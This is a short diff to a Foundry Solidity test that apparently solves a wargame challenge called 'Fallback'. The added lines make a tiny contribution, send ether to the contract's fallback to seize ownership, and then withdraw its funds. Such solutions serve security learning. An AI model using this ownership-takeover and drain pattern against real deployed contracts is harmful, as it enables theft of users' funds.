@@ -39,6 +39,9 @@ contract TestFallback is BaseTest {
         vm.startPrank(player);
 
         // Solve The Challenge
+        (bool succ,) = levelAddress.call{value: 1}(abi.encodeWithSignature("contribute()"));
+        (succ,) = levelAddress.call{value: 1}("");
+        level.withdraw();
 
         vm.stopPrank();
     }
